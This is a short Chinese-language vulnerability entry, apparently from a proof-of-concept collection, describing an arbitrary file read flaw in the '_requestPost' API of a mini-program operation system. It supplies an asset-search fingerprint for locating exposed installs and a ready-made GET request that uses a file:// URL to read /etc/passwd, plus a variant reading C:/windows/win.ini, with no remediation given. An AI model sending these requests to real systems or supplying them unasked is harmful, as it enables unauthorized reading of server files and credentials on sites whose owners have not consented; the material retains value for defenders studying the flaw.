# 全行业小程序运营系统接口_requestPost存在任意文件读取漏洞

# 一、漏洞简介
全行业小程序运营系统是一个无需编程，各行业模版直接套用，一键生成，轻松搭建小程序，界面自由DIY，同步实时预览，可视化操作让您所见即所得，随心打造个性小程序。全行业小程序运营系统接口_requestPost存在任意文件读取漏洞

# 二、影响版本
全行业小程序运营系统

# 三、资产测绘
```plain
"/com/css/head_foot.css"
```

![1721066404678-898e96b4-2cea-4e70-9dac-653d60e96720.png](./img/bH9l78edGUcZCbQD/1721066404678-898e96b4-2cea-4e70-9dac-653d60e96720-692946.png)

# 四、漏洞复现
```plain
GET /api/wxapps/_requestPost?url=file:///etc/passwd&data=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```

![1721067419506-8c5e67ed-72de-4ba9-86f6-3fd3fd3f9a0d.png](./img/bH9l78edGUcZCbQD/1721067419506-8c5e67ed-72de-4ba9-86f6-3fd3fd3f9a0d-553972.png)

```plain
/api/wxapps/_requestPost?url=file:///C:/windows/win.ini&data=1
```

![1721067536077-3ea5d227-9a72-4564-b33c-443cef0742f5.png](./img/bH9l78edGUcZCbQD/1721067536077-3ea5d227-9a72-4564-b33c-443cef0742f5-856042.png)



> 更新: 2024-08-12 17:16:00  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xhsw1s8g1fmxb8nf>